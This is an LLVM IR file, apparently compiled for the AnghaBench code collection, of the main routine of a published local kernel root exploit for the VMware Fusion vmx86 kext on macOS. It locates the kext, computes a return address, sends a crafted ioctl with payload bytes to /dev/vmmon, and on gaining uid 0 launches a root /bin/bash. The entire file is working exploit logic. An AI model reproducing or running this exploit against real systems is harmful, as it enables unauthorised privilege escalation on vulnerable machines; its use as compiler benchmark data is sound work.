; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_10076.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_10076.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i32* }
%struct.TYPE_3__ = type { i8*, i32, i64, i32*, i64 }
%struct.ioctl_req = type { i32* }

@.str = private unnamed_addr constant [138 x i8] c"VMware Fusion <= 2.0.5 vmx86 kext local kernel root exploit\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2009!@$!\0A\0A\00", align 1
@KERN_SUCCESS = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [54 x i8] c"* couldn't get list of loaded kexts from kernel - %s\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [22 x i8] c"com.vmware.kext.vmx86\00", align 1
@.str.3 = private unnamed_addr constant [28 x i8] c"%s: vmx86 kext not loaded?\0A\00", align 1
@targets_t = common dso_local global %struct.TYPE_4__* null, align 8
@.str.4 = private unnamed_addr constant [45 x i8] c"%s: unsupported vmx86 version found :( [%s]\0A\00", align 1
@.str.5 = private unnamed_addr constant [49 x i8] c"* kmod: %s, version: %s, addr: 0x%08X -> 0x%08X\0A\00", align 1
@.str.6 = private unnamed_addr constant [39 x i8] c"* ret addr: 0x%08X + 0x%08X = @0x%08X\0A\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"/dev/vmmon\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [17 x i8] c"%s: open failed\0A\00", align 1
@zleopard = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [13 x i8] c"* hitting...\00", align 1
@stdout = common dso_local global i32 0, align 4
@VMX86_INIT_IOCTL = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [7 x i8] c"done\0A\0A\00", align 1
@.str.11 = private unnamed_addr constant [16 x i8] c"* getuid(): %d\0A\00", align 1
@.str.12 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@__const.main.args = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i32 0, i32 0), i8* null], align 16
@.str.13 = private unnamed_addr constant [9 x i8] c"+Wh00t\0A\0A\00", align 1
@.str.14 = private unnamed_addr constant [30 x i8] c"%s: failed to obtain root :(\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.TYPE_3__*, align 8
  %7 = alloca %struct.TYPE_3__*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca %struct.ioctl_req, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2 x i8*], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([138 x i8], [138 x i8]* @.str, i64 0, i64 0))
  %19 = call i32 (...) @mach_host_self()
  store i32 %19, i32* %8, align 4
  %20 = load i32, i32* %8, align 4
  %21 = bitcast %struct.TYPE_3__** %6 to i8*
  %22 = call i64 @kmod_get_info(i32 %20, i8* %21, i32* %11)
  store i64 %22, i64* %9, align 8
  %23 = load i64, i64* %9, align 8
  %24 = load i64, i64* @KERN_SUCCESS, align 8
  %25 = icmp ne i64 %23, %24
  br i1 %25, label %26, label %33

26:                                               ; preds = %2
  %27 = load i32, i32* @stderr, align 4
  %28 = load i64, i64* %9, align 8
  %29 = call i8* @mach_error_string(i64 %28)
  %30 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %27, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.1, i64 0, i64 0), i8* %29)
  %31 = load i32, i32* @EXIT_FAILURE, align 4
  %32 = call i32 @exit(i32 %31) #4
  unreachable

33:                                               ; preds = %2
  %34 = load %struct.TYPE_3__*, %struct.TYPE_3__** %6, align 8
  store %struct.TYPE_3__* %34, %struct.TYPE_3__** %7, align 8
  br label %35

35:                                               ; preds = %55, %33
  %36 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %37 = icmp ne %struct.TYPE_3__* %36, null
  br i1 %37, label %38, label %57

38:                                               ; preds = %35
  %39 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %40 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %39, i32 0, i32 3
  %41 = load i32*, i32** %40, align 8
  %42 = call i64 @strcmp(i32* %41, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0))
  %43 = icmp eq i64 %42, 0
  br i1 %43, label %44, label %45

44:                                               ; preds = %38
  br label %57

45:                                               ; preds = %38
  br label %46

46:                                               ; preds = %45
  %47 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %48 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %47, i32 0, i32 4
  %49 = load i64, i64* %48, align 8
  %50 = icmp ne i64 %49, 0
  br i1 %50, label %51, label %54

51:                                               ; preds = %46
  %52 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %53 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %52, i64 1
  br label %55

54:                                               ; preds = %46
  br label %55

55:                                               ; preds = %54, %51
  %56 = phi %struct.TYPE_3__* [ %53, %51 ], [ null, %54 ]
  store %struct.TYPE_3__* %56, %struct.TYPE_3__** %7, align 8
  br label %35

57:                                               ; preds = %44, %35
  %58 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %59 = icmp eq %struct.TYPE_3__* %58, null
  br i1 %59, label %60, label %68

60:                                               ; preds = %57
  %61 = load i32, i32* @stderr, align 4
  %62 = load i8**, i8*** %5, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 0
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %61, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0), i8* %64)
  %66 = load i32, i32* @EXIT_FAILURE, align 4
  %67 = call i32 @exit(i32 %66) #4
  unreachable

68:                                               ; preds = %57
  store i32 0, i32* %15, align 4
  br label %69

69:                                               ; preds = %97, %68
  %70 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets_t, align 8
  %71 = load i32, i32* %15, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %70, i64 %72
  %74 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %73, i32 0, i32 1
  %75 = load i32*, i32** %74, align 8
  %76 = icmp ne i32* %75, null
  br i1 %76, label %77, label %100

77:                                               ; preds = %69
  %78 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets_t, align 8
  %79 = load i32, i32* %15, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %78, i64 %80
  %82 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %81, i32 0, i32 1
  %83 = load i32*, i32** %82, align 8
  %84 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %85 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %84, i32 0, i32 0
  %86 = load i8*, i8** %85, align 8
  %87 = call i64 @strcmp(i32* %83, i8* %86)
  %88 = icmp eq i64 %87, 0
  br i1 %88, label %89, label %96

89:                                               ; preds = %77
  %90 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets_t, align 8
  %91 = load i32, i32* %15, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %90, i64 %92
  %94 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 8
  store i32 %95, i32* %12, align 4
  br label %100

96:                                               ; preds = %77
  br label %97

97:                                               ; preds = %96
  %98 = load i32, i32* %15, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %15, align 4
  br label %69

100:                                              ; preds = %89, %69
  %101 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets_t, align 8
  %102 = load i32, i32* %15, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %101, i64 %103
  %105 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %104, i32 0, i32 1
  %106 = load i32*, i32** %105, align 8
  %107 = icmp eq i32* %106, null
  br i1 %107, label %108, label %119

108:                                              ; preds = %100
  %109 = load i32, i32* @stderr, align 4
  %110 = load i8**, i8*** %5, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 0
  %112 = load i8*, i8** %111, align 8
  %113 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %114 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %113, i32 0, i32 0
  %115 = load i8*, i8** %114, align 8
  %116 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %109, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.4, i64 0, i64 0), i8* %112, i8* %115)
  %117 = load i32, i32* @EXIT_FAILURE, align 4
  %118 = call i32 @exit(i32 %117) #4
  unreachable

119:                                              ; preds = %100
  %120 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %121 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %120, i32 0, i32 3
  %122 = load i32*, i32** %121, align 8
  %123 = call i8* @strrchr(i32* %122, i8 signext 46)
  %124 = getelementptr inbounds i8, i8* %123, i64 1
  %125 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %126 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %125, i32 0, i32 0
  %127 = load i8*, i8** %126, align 8
  %128 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %129 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %128, i32 0, i32 1
  %130 = load i32, i32* %129, align 8
  %131 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %132 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %131, i32 0, i32 1
  %133 = load i32, i32* %132, align 8
  %134 = sext i32 %133 to i64
  %135 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %136 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %135, i32 0, i32 2
  %137 = load i64, i64* %136, align 8
  %138 = add nsw i64 %134, %137
  %139 = trunc i64 %138 to i32
  %140 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.5, i64 0, i64 0), i8* %124, i8* %127, i32 %130, i32 %139)
  %141 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %142 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %141, i32 0, i32 1
  %143 = load i32, i32* %142, align 8
  %144 = load i32, i32* %12, align 4
  %145 = add nsw i32 %144, 4096
  %146 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %147 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %146, i32 0, i32 1
  %148 = load i32, i32* %147, align 8
  %149 = load i32, i32* %12, align 4
  %150 = add nsw i32 %148, %149
  %151 = add nsw i32 %150, 4096
  %152 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.6, i64 0, i64 0), i32 %143, i32 %145, i32 %151)
  %153 = load i32, i32* @O_RDONLY, align 4
  %154 = call i32 @open(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0), i32 %153)
  store i32 %154, i32* %13, align 4
  %155 = load i32, i32* %13, align 4
  %156 = icmp slt i32 %155, 0
  br i1 %156, label %157, label %165

157:                                              ; preds = %119
  %158 = load i32, i32* @stderr, align 4
  %159 = load i8**, i8*** %5, align 8
  %160 = getelementptr inbounds i8*, i8** %159, i64 0
  %161 = load i8*, i8** %160, align 8
  %162 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %158, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0), i8* %161)
  %163 = load i32, i32* @EXIT_FAILURE, align 4
  %164 = call i32 @exit(i32 %163) #4
  unreachable

165:                                              ; preds = %119
  %166 = call i32 @memset(%struct.ioctl_req* %10, i32 204, i32 8)
  %167 = getelementptr inbounds %struct.ioctl_req, %struct.ioctl_req* %10, i32 0, i32 0
  %168 = load i32, i32* @zleopard, align 4
  %169 = call i32 @memcpy(i32** %167, i32 %168, i32 3)
  %170 = load %struct.TYPE_3__*, %struct.TYPE_3__** %7, align 8
  %171 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 8
  %173 = load i32, i32* %12, align 4
  %174 = add nsw i32 %172, %173
  %175 = add nsw i32 %174, 4096
  %176 = getelementptr inbounds %struct.ioctl_req, %struct.ioctl_req* %10, i32 0, i32 0
  %177 = load i32*, i32** %176, align 8
  %178 = getelementptr inbounds i32, i32* %177, i64 33
  store i32 %175, i32* %178, align 4
  %179 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i64 0, i64 0))
  %180 = load i32, i32* @stdout, align 4
  %181 = call i32 @fflush(i32 %180)
  %182 = call i32 @sleep(i32 2)
  %183 = load i32, i32* %13, align 4
  %184 = load i32, i32* @VMX86_INIT_IOCTL, align 4
  %185 = call i32 @ioctl(i32 %183, i32 %184, %struct.ioctl_req* %10)
  store i32 %185, i32* %16, align 4
  %186 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i64 0, i64 0))
  %187 = load i32, i32* %13, align 4
  %188 = call i32 @close(i32 %187)
  %189 = call i32 (...) @getuid()
  store i32 %189, i32* %14, align 4
  %190 = load i32, i32* %14, align 4
  %191 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.11, i64 0, i64 0), i32 %190)
  %192 = load i32, i32* %14, align 4
  %193 = icmp eq i32 %192, 0
  br i1 %193, label %194, label %201

194:                                              ; preds = %165
  %195 = bitcast [2 x i8*]* %17 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %195, i8* align 16 bitcast ([2 x i8*]* @__const.main.args to i8*), i64 16, i1 false)
  %196 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i64 0, i64 0))
  %197 = getelementptr inbounds [2 x i8*], [2 x i8*]* %17, i64 0, i64 0
  %198 = load i8*, i8** %197, align 16
  %199 = getelementptr inbounds [2 x i8*], [2 x i8*]* %17, i64 0, i64 0
  %200 = call i32 @execve(i8* %198, i8** %199, i32* null)
  br label %207

201:                                              ; preds = %165
  %202 = load i32, i32* @stderr, align 4
  %203 = load i8**, i8*** %5, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 0
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %202, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.14, i64 0, i64 0), i8* %205)
  br label %207

207:                                              ; preds = %201, %194
  %208 = load i32, i32* @EXIT_SUCCESS, align 4
  ret i32 %208
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @mach_host_self(...) #1

declare dso_local i64 @kmod_get_info(i32, i8*, i32*) #1

declare dso_local i32 @fprintf(i32, i8*, i8*, ...) #1

declare dso_local i8* @mach_error_string(i64) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @strcmp(i32*, i8*) #1

declare dso_local i8* @strrchr(i32*, i8 signext) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @memset(%struct.ioctl_req*, i32, i32) #1

declare dso_local i32 @memcpy(i32**, i32, i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @ioctl(i32, i32, %struct.ioctl_req*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @getuid(...) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @execve(i8*, i8**, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
